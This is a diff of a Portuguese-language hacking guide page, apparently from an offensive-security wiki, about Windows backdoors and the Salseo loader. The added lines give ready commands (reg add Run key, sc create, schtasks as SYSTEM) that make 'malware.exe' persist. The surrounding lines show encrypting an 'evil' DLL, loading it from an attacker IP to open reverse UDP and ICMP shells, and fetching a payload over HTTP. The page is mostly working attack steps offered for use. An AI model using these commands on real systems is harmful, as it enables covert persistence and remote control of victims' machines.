@@ -45,21 +45,39 @@ O Windows é o sistema operacional mais utilizado no mundo, o que o torna um alv
 
 ### Backdoors
 
-#### Backdoor de Registro
+#### Porta dos Fundos do Registro
 
-O registro do Windows é um banco de dados que armazena configurações e opções para o sistema operacional e para os programas instalados. Um backdoor pode ser adicionado ao registro para permitir que um invasor acesse o sistema sem ser detectado. Isso pode ser feito adicionando uma chave de registro que executa um comando ou script malicioso.
+O Registro do Windows é um banco de dados que armazena configurações e opções para o sistema operacional e para os aplicativos instalados. Uma técnica comum de backdoor é adicionar uma entrada ao Registro que execute um programa malicioso sempre que o sistema é iniciado.
 
-#### Backdoor de Serviço
+Para adicionar uma entrada de Registro, use o comando `reg add` no prompt de comando. Por exemplo, o seguinte comando adiciona uma entrada de Registro que executa o arquivo `malware.exe` sempre que o sistema é iniciado:
 
-Os serviços do Windows são programas que são executados em segundo plano e fornecem funcionalidades para o sistema operacional e para os programas instalados. Um backdoor pode ser adicionado como um serviço para permitir que um invasor acesse o sistema sem ser detectado. Isso pode ser feito criando um serviço que executa um comando ou script malicioso.
+```
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Malware" /t REG_SZ /d "C:\malware.exe" /f
+```
 
-#### Backdoor de Arquivo
+#### Porta dos Fundos do Serviço
 
-Um backdoor pode ser adicionado a um arquivo executável do Windows para permitir que um invasor acesse o sistema sem ser detectado. Isso pode ser feito injetando código malicioso no arquivo executável ou anexando um arquivo executável malicioso a um arquivo legítimo.
+Os serviços do Windows são programas que são executados em segundo plano e fornecem funcionalidades para o sistema operacional e para os aplicativos instalados. Uma técnica comum de backdoor é criar um serviço que execute um programa malicioso.
+
+Para criar um serviço, use o comando `sc create` no prompt de comando. Por exemplo, o seguinte comando cria um serviço chamado `MalwareService` que executa o arquivo `malware.exe`:
+
+```
+sc create MalwareService binPath= "C:\malware.exe" start= auto
+```
+
+#### Porta dos Fundos do Agendador de Tarefas
+
+O Agendador de Tarefas do Windows é uma ferramenta que permite agendar a execução de programas em horários específicos ou em eventos específicos, como o início do sistema ou o login de um usuário. Uma técnica comum de backdoor é criar uma tarefa agendada que execute um programa malicioso.
+
+Para criar uma tarefa agendada, use o comando `schtasks` no prompt de comando. Por exemplo, o seguinte comando cria uma tarefa agendada chamada `MalwareTask` que executa o arquivo `malware.exe` sempre que o sistema é iniciado:
+
+```
+schtasks /create /tn "MalwareTask" /tr "C:\malware.exe" /sc onstart /ru SYSTEM
+```
 
 ### Conclusão
 
-Existem várias técnicas de backdoor que podem ser usadas em sistemas Windows. É importante que os administradores de sistemas estejam cientes dessas técnicas e tomem medidas para proteger seus sistemas contra elas.
+Existem muitas técnicas de backdoor que podem ser usadas em sistemas Windows. É importante que os administradores de sistemas estejam cientes dessas técnicas e tomem medidas para proteger seus sistemas contra elas.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -86,7 +104,7 @@ SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <A
 
 **Desta vez, você precisa de uma ferramenta especial no cliente para receber o shell reverso. Baixe:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
-#### **Desativando as respostas ICMP:**
+#### **Desativando Respostas ICMP:**
 ```
 sysctl -w net.ipv4.icmp_echo_ignore_all=1
 
@@ -115,7 +133,7 @@ Abra o projeto SalseoLoader usando o Visual Studio.
 
 ![](<../.gitbook/assets/image (3) (1) (1) (1).png>)
 
-#### **Procure pelo pacote DllExport (usando a guia Procurar), e pressione Instalar (e aceite o popup)**
+#### **Procure pelo pacote DllExport (usando a guia Procurar) e pressione Instalar (e aceite o popup)**
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1).png>)
 
@@ -141,11 +159,11 @@ Selecione **x64** (se você for usá-lo dentro de uma caixa x64, esse foi o meu 
 
 **\[DllExport]** não deve mais ser marcado como erro
 
-![](<../.gitbook/assets/image (8) (1) (1).png>)
+![](<../.gitbook/assets/image (8) (1).png>)
 
 ### Compile a solução
 
-Selecione **Tipo de Saída = Biblioteca de Classes** (Projeto --> Propriedades do SalseoLoader --> Aplicativo --> Tipo de saída = Biblioteca de Classes)
+Selecione **Tipo de Saída = Biblioteca de Classes** (Projeto --> Propriedades do SalseoLoader --> Aplicativo --> Tipo de Saída = Biblioteca de Classes)
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
@@ -180,7 +198,7 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-CMD (Command Prompt) é uma ferramenta de linha de comando do Windows que permite aos usuários interagir com o sistema operacional por meio de comandos. É uma ferramenta poderosa para hackers, pois permite executar comandos rapidamente e sem a necessidade de uma interface gráfica. Além disso, muitas ferramentas de hacking são executadas por meio do CMD.
+CMD é um acrônimo para Command Prompt, que é uma ferramenta de linha de comando usada para executar comandos no sistema operacional Windows. É uma ferramenta poderosa para hackers, pois permite executar comandos rapidamente e sem a necessidade de uma interface gráfica. Além disso, muitas ferramentas de hacking são executadas por meio do CMD, tornando-o uma ferramenta essencial para qualquer hacker.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
